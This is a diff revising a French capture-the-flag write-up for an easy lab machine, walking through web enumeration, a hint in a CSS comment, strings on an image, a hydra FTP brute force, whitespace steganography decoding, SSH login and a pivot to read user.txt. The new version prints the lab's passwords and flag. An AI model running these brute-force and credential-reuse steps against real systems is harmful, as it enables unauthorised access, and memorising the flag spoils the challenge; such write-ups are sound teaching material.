@@ -1,102 +1,77 @@
 # Write-up : "Musa Troglodytarum"
 
-**Cible :** 10.10.0.X (vhost `viridiancity.epi`, l'IP change à chaque redéploiement)
+**Cible :** 10.10.0.X (l'IP change à chaque redéploiement, revérifie-la)
 
 **Objectif :** Obtenir user.txt
 
 **Difficulté :** Easy
 
-**Date :** 21/09/2026
+**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs
 
-**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, directory listing, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs
+**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, python3
 
-**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, CyberChef
+---
+
+## 0. Définir l'IP de la cible
+
+```bash
+ip=10.10.0.X
+```
+Toutes les commandes utilisent `$ip` ensuite.
 
 ---
 
 ## 1. Scan des ports
 
 ```bash
-nmap -sV 10.10.0.X
+nmap -sV -p- $ip
 ```
-
 Résultat : `21` (FTP), `22` (SSH), `80` (HTTP, page "It works").
-
-On ajoute le nom du site :
-
-```bash
-echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
-```
-Cette ligne dit à ta machine : « viridiancity.epi = cette IP ». `tee -a` = ajouter à la fin du fichier `/etc/hosts`.
 
 ---
 
-## 2. Un indice caché dans le CSS
-
-La page d'accueil parle d'une « vidéo » : c'est un piège, on l'ignore. Le vrai indice est dans la feuille de style :
+## 2. Indice caché dans le CSS
 
 ```bash
-curl http://viridiancity.epi/assets/style.css
+curl -s http://$ip/assets/style.css
 ```
+Un commentaire en bas donne la page cachée `/l3_B4n4N13r_D3s_M0nT4gN3s.php`. (La « vidéo » de la page d'accueil est un piège.)
 
-En bas, un commentaire :
-
-```
-Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
-```
-
-**Faille :** info sensible laissée dans un fichier annexe (CWE-200).
+**Faille :** info sensible dans un fichier annexe (CWE-200).
 
 ---
 
 ## 3. Suivre la page cachée
 
 ```bash
-curl -i http://viridiancity.epi/l3_B4n4N13r_D3s_M0nT4gN3s.php
+curl -i http://$ip/l3_B4n4N13r_D3s_M0nT4gN3s.php
 ```
-`-i` = affiche les en-têtes. La page vide renvoie une redirection.
-
-L'en-tête `Location:` révèle un dossier caché :
-`/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`
+`-i` = affiche les en-têtes. L'en-tête `Location:` révèle le dossier caché `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`.
 
 **Faille :** chemin "secret" non protégé (CWE-425).
 
 ---
 
-## 4. Récupérer l'image cachée
+## 4. Télécharger l'image directement
 
-Ouvre le dossier dans ton navigateur (ou avec curl) :
-
-```bash
-curl http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
-```
-
-Il contient `Hot_Babe.png`. Télécharge-le :
+> Lister le dossier renvoie une redirection 301 vers un ServerName cassé (10.10.0.10). On va donc **directement chercher le fichier** :
 
 ```bash
-wget http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png
+wget "http://$ip/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png"
 ```
 
 **Faille :** directory listing activé (CWE-548).
 
 ---
 
-## 5. Lire le texte caché dans l'image
+## 5. Lire le texte caché + construire la wordlist
 
 ```bash
-strings Hot_Babe.png
+strings Hot_Babe.png | grep -i FTP
+strings Hot_Babe.png | sed -n '/One of these is the password/,$p' | tail -n +2 > passwords.txt
+wc -l passwords.txt
 ```
-`strings` affiche le texte lisible d'un fichier.
-
-Tout en bas :
-
-```
-Username for FTP is banane_celeste
-One of these is the password:
-(200 mots de passe)
-```
-
-Copie la liste de mots de passe dans un fichier `passwords.txt` (copier-coller, ou avec un éditeur).
+→ login `banane_celeste` + ~200 mots de passe candidats dans `passwords.txt`.
 
 **Faille :** login et mots de passe cachés dans une image (CWE-200).
 
@@ -105,55 +80,42 @@ Copie la liste de mots de passe dans un fichier `passwords.txt` (copier-coller, 
 ## 6. Brute force du FTP
 
 ```bash
-hydra -l banane_celeste -P passwords.txt -f ftp://10.10.0.X
+hydra -l banane_celeste -P passwords.txt -f -t 4 ftp://$ip
 ```
-`-l` = le login, `-P` = la liste, `-f` = s'arrête dès qu'il trouve.
-
-Hydra affiche le bon mot de passe FTP.
+`-t 4` = peu de connexions en parallèle (le FTP coupe les reconnexions rapides).
+> Si « too many connection errors », descends à `-t 1` :
+> ```bash
+> hydra -l banane_celeste -P passwords.txt -f -t 1 ftp://$ip
+> ```
 
 **Faille :** pas de protection contre le brute force (CWE-307).
 
 ---
 
-## 7. Se connecter au FTP et prendre le fichier
+## 7. Récupérer le fichier via FTP
 
 ```bash
-ftp 10.10.0.X
+wget "ftp://banane_celeste:<MDP_TROUVE>@$ip/Valerian's_Creds.txt"
+mv "Valerian's_Creds.txt" creds.txt
+cat -A creds.txt | head
 ```
-Puis dans le FTP :
-```
-Name: banane_celeste
-Password: <le mdp trouvé>
-ls
-get Valerian's_Creds.txt
-bye
-```
-`ls` liste, `get` télécharge, `bye` quitte.
-
-Regarde le fichier :
-```bash
-cat -A Valerian's_Creds.txt
-```
-`cat -A` montre les tabulations `^I` et les espaces : le fichier est plein de blancs, c'est un message caché.
+`cat -A` montre les tabulations `^I` et les espaces → le fichier est de la stéganographie par espaces/tabs. (On renomme en `creds.txt` pour éviter l'apostrophe qui gêne les commandes.)
 
 ---
 
-## 8. Décoder la stéganographie (espaces/tabs) avec CyberChef
+## 8. Décoder la stéganographie (terminal)
 
-Le contenu est du binaire caché : espace = 0, tabulation = 1, 8 bits = 1 lettre.
-Pas besoin de coder, on utilise CyberChef ([cyberchef.io](https://cyberchef.io)) :
+> CyberChef « From Binary » ne marche PAS ici : l'encodage est **1 octet par ligne** (sur les 8 derniers bits) avec des lignes séparatrices, donc un flux continu se désaligne. On utilise ce décodage :
 
-1. Colle le contenu de `Valerian's_Creds.txt` dans Input.
-2. Dans la recette (Recipe), glisse :
-   - Find / Replace : chercher `\t` (mode Regex), remplacer par `1`
-   - Find / Replace : chercher ` ` (un espace), remplacer par `0`
-   - From Binary
-3. Le résultat s'affiche dans Output :
-
+```bash
+python3 -c 'out=""
+for l in open("creds.txt"):
+    s=l.rstrip("\r\n")
+    if len(s)>2 and set(s)<=set(" \t"):
+        out+=chr(int(s.replace(" ","0").replace(chr(9),"1")[-8:],2))
+print(out)'
 ```
-User: valerian
-Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
-```
+→ `User: valerian` / `Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP`
 
 **Faille :** identifiants cachés par stéganographie (CWE-311).
 
@@ -162,11 +124,16 @@ Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
 ## 9. Connexion SSH en valerian
 
 ```bash
-ssh valerian@10.10.0.X
+ssh valerian@$ip
 ```
 (mot de passe : `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)
 
-Le message d'accueil dit : « check our s3cr3t hiding place », c'est un indice.
+> Si « REMOTE HOST IDENTIFICATION HAS CHANGED » (box redéployée), supprime l'ancienne clé puis reconnecte-toi :
+> ```bash
+> ssh-keygen -f /root/.ssh/known_hosts -R $ip
+> ```
+
+Le message d'accueil parle d'une « s3cr3t hiding place ».
 
 **Faille :** réutilisation d'identifiants exposés (CWE-522).
 
@@ -174,27 +141,11 @@ Le message d'accueil dit : « check our s3cr3t hiding place », c'est un indice.
 
 ## 10. Trouver la cachette
 
-`user.txt` n'est pas dans le home. On cherche la « cachette » :
-
 ```bash
 find / -iname "*s3cr3t*" 2>/dev/null
-```
-`find` cherche partout ; `2>/dev/null` cache les erreurs de permission.
-
-Résultat : `/usr/games/s3cr3t/`. Il contient un fichier caché :
-
-```bash
 cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
 ```
-
-Message :
-
-```
-... just a reminder ... "ca_serait_jamais_arrive_en_haskell" ...
-   -Valerian
-```
-
-Mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`
+→ mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`
 
 **Faille :** mot de passe en clair dans un fichier (CWE-256).
 
@@ -204,28 +155,24 @@ Mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`
 
 ```bash
 su gabriel
-```
-(mot de passe : `ca_serait_jamais_arrive_en_haskell`)
-
-```bash
 cat ~/user.txt
 ```
-
-**FLAG :** `EPI{...}` (remplace par ta valeur)
+→ `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`
 
 ---
 
 ## Résumé des étapes
 
-1. Commentaire CSS : la page `.php`.
-2. Cette page (302) : un dossier caché.
-3. Le dossier contient `Hot_Babe.png`.
-4. `strings` sur l'image : login FTP et liste de mots de passe.
-5. `hydra` : le mot de passe FTP.
-6. FTP : `Valerian's_Creds.txt` (espaces/tabs).
-7. CyberChef : mot de passe de valerian.
-8. SSH valerian, message caché : mot de passe de gabriel.
-9. `su gabriel` : `user.txt`.
+1. `nmap` : 21/22/80.
+2. `style.css` : page `.php` cachée.
+3. `curl -i` sur la page : redirection (302) vers un dossier caché.
+4. `wget` direct de `Hot_Babe.png`.
+5. `strings` : login FTP + wordlist.
+6. `hydra -t 4` : le mot de passe FTP.
+7. FTP : `Valerian's_Creds.txt` (espaces/tabs) → renommé `creds.txt`.
+8. décodage terminal : mot de passe de valerian.
+9. `ssh valerian`, message caché : mot de passe de gabriel.
+10. `su gabriel` : `user.txt`.
 
 ## Failles exploitées
 
@@ -244,5 +191,5 @@ cat ~/user.txt
 - Toujours lire les fichiers annexes (CSS, commentaires) : l'indice y était.
 - Un `curl` qui n'affiche rien = une redirection, refais avec `-i`.
 - `strings` révèle le texte caché dans une image.
-- Un fichier plein d'espaces/tabs = du binaire : CyberChef (space=0, tab=1, From Binary), aucun code nécessaire.
+- Stégano espaces/tabs ici = **décodage terminal** (CyberChef ne suffit pas pour ce format).
 - La « vidéo » est un piège volontaire.
